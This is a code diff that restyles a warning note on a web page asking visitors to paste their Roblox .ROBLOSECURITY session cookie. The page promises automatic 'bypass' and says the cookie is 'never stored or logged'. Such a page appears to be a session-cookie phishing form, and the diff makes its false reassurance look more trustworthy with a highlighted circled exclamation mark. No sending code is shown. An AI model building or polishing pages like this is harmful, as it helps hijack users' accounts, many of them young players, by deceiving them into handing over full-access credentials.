@@ -62,7 +62,7 @@
       padding-left: 0.85rem;
     }
 
-    /* note row — inline exclamation + text exactly as "! Only 13+ accounts..." */
+    /* note row — exclamation mark inside a circle highlight */
     .note {
       background: rgba(255, 94, 94, 0.08);
       border-radius: 14px;
@@ -71,14 +71,32 @@
       font-size: 0.8rem;
       color: #cbd5ff;
       border: 0.5px solid rgba(255, 94, 94, 0.2);
+      display: flex;
+      align-items: center;
+      gap: 0.65rem;
+    }
+
+    .circle-exclamation {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background: #ff5e5e;
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      font-weight: 800;
+      font-size: 0.9rem;
+      color: white;
+      flex-shrink: 0;
+      box-shadow: 0 2px 6px rgba(255, 94, 94, 0.4);
     }
 
     .note-text {
-      display: block;
       line-height: 1.4;
+      flex: 1;
     }
 
-    .note strong {
+    .note-text strong {
       color: #ffa26b;
       font-weight: 600;
     }
@@ -224,9 +242,10 @@
       Enter your .ROBLOSECURITY cookie below. We will verify, authenticate, and bypass your cookie automatically.
     </div>
 
-    <!-- Note formatted exactly as: "! Only 13+ accounts are supported. Cookie is processed server-side and never stored or logged." -->
+    <!-- Note with circled exclamation mark, text inline -->
     <div class="note">
-      <div class="note-text">! Only <strong>13+ accounts</strong> are supported. Cookie is processed server-side and never stored or logged.</div>
+      <div class="circle-exclamation">!</div>
+      <div class="note-text">Only <strong>13+ accounts</strong> are supported. Cookie is processed server-side and never stored or logged.</div>
     </div>
 
     <div class="label">.ROBLOSECURITY COOKIE</div>
